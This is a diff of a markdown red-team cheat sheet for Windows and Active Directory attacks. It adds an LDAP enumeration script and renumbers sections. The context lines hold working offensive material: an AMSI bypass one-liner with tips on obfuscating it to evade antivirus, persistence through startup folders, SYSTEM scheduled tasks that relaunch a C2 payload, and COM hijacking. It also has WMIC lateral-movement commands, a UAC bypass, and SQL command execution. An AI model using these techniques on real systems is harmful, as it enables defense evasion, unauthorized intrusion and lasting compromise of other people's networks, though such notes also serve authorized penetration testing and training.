@@ -9,7 +9,33 @@ It should be useful in a lot of cases when dealing with Windows / AD exploitatio
 
 ## Enumeration
 
-# 0) PowerShell one-liners
+### 1) LDAP AD enumeration
+
+```powershell
+#Build LDAP filters to look for users with SPN values registered for current domain
+#$ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
+
+#Build LDAP filters to look for domain controller
+$ldapFilter = "(primaryGroupID=516)"
+
+$domain = New-Object System.DirectoryServices.DirectoryEntry
+
+$search = New-Object System.DirectoryServices.DirectorySearcher
+
+$search.SearchRoot = $domain
+$search.Filter = $ldapFilter
+$search.SearchScope = "Subtree"
+
+$results = $search.FindAll()
+
+foreach ($result in $results)
+{
+	$object = $result.GetDirectoryEntry()
+	Write-Host "Object Name = " $object.name
+}
+```
+
+## 2) PowerShell one-liners
 
 .NET reflection allows an application to obtain information about loaded assemblies and the types defined within them, then even create and invoke new instances.
 
@@ -107,7 +133,7 @@ $parameters=@("arg1", "arg2")
 
 
 
-### 1) Powershell AMSI Bypass
+### 3) Powershell AMSI Bypass
 
 Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.
 
@@ -141,8 +167,6 @@ AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, scri
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
 
-
-### 2) Powershell Oneliner
 
 ### 3) Applocker 
 
@@ -230,9 +254,9 @@ BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
 ```
 
 
-# Persistence
+## Persistence
 
-##### 1) Classic Startup folder
+### 1) Classic Startup folder
 
 Just drop a binary in current user folder, will trigger when current user signs in:
 
@@ -245,7 +269,7 @@ Or in the startup folder, requires administrative privileges but will trigger as
 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-##### 2) Schedule Tasks
+### 2) Schedule Tasks
 
 This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.
 
@@ -279,7 +303,7 @@ To execute this PowerShell script on the target, go to the Interact CLI, import 
 schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
 ```
 
-##### 3) COM Hijacks
+### 3) COM Hijacks
 
 Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).
 
@@ -315,16 +339,16 @@ foreach ($Task in $Tasks)
 }
 ```
 
-# Lateral Movement
+## Lateral Movement
 
-##### WMIC Lateral Movement
+### 1) WMIC Lateral Movement
 
 ```cpp
 wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
 WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
 ```
 
-# MSSQL databases
+## MSSQL databases
 
 PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.
 
@@ -355,9 +379,9 @@ Invoke-SQLOSCmd -Instance sql-1.cyberbotic.io -Command 'dir C:\' -RawResults
 Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
 ```
 
-# Domain Dominance
+## Domain Dominance
 
-# Misc & Encoding
+## Misc & Encoding
 
 ##### PeZOR Packing and Encoding 
 
